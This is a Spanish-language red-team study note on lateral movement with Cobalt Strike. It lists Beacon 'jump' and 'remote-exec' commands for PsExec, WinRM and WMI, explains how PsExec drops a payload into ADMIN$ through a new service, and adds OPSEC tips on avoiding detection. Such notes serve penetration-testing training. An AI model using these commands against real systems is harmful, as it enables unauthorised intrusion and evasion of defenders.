---
tags: [lateral-movement, cobalt-strike, jump, remote-exec, psexec, winrm]
status: done
platform: windows
---

# Jump & Remote-Exec (Cobalt Strike)

> Técnicas integradas de Cobalt Strike para movimiento lateral.

---

## jump — Crear nuevo Beacon en destino

```
beacon> jump <técnica> <target> <listener>

# Técnicas disponibles:
beacon> jump psexec     target  smb    # PsExec → Beacon en ADMIN$
beacon> jump psexec64   target  smb    # PsExec 64-bit
beacon> jump winrm      target  smb    # WinRM 
beacon> jump winrm64    target  smb    # WinRM 64-bit
beacon> jump wmi        target  http   # WMI
beacon> jump wmi64      target  http   # WMI 64-bit
```

**Nota OPSEC:** Todos usan Logon Type 3 (Network) → no dejan creds en LSASS del destino, pero no tendrás TGT en la nueva sesión → [[04-lateral-movement/tecnicas/security-logon-types|Security Logon Types]].

---

## remote-exec — Ejecutar comando sin crear Beacon

```
beacon> remote-exec <técnica> <target> <command>

# Técnicas:
beacon> remote-exec psexec  target  cmd.exe /c whoami
beacon> remote-exec wmi     target  Get-Process
beacon> remote-exec winrm   target  ipconfig
```

**Cuándo usar:** Enumeración rápida sin necesitar un Beacon completo en el destino.

---

## Diferencia jump vs remote-exec

| | jump | remote-exec |
|-|------|-------------|
| Resultado | Nuevo Beacon | Output del comando |
| Requiere listener | ✅ Sí | ❌ No |
| Movimiento lateral real | ✅ | ❌ (solo ejecución) |

---

## PsExec — Detalle

PsExec crea un servicio temporal en el destino para ejecutar el payload:
- Sube el payload a `ADMIN$`
- Crea servicio con `sc create`
- Inicia el servicio
- Limpia (idealmente)

> ⚠️ Event ID 7045 (nuevo servicio creado) — muy monitorizado.
> Alternativa más sigilosa: [[04-lateral-movement/tecnicas/custom-techniques#SCShell|Custom Techniques]]

---

## WinRM — Detalle

Usa el servicio Windows Remote Management (puerto 5985/5986):
```
# Prerequisito: WinRM habilitado en el objetivo
winrm quickconfig     # Habilitar en el objetivo (requiere privilegios)
```

> WinRM suele estar habilitado en servidores Windows, menos en workstations.

